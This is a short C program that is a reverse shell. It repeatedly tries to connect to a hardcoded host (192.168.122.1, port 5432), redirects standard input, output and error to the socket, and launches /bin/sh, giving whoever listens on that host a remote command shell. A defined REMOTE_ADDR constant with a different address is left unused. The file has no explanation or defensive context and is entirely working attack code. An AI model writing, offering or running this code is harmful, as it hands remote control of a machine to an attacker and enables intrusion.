#include <stdio.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define REMOTE_ADDR "192.168.56.102"
#define REMOTE_PORT 5432

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("192.168.122.1");
    sa.sin_port = htons(5432);

    s = socket(AF_INET, SOCK_STREAM, 0);

    while ((connect(s, (struct sockaddr *)&sa, sizeof(sa))) != 0)
        ;
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
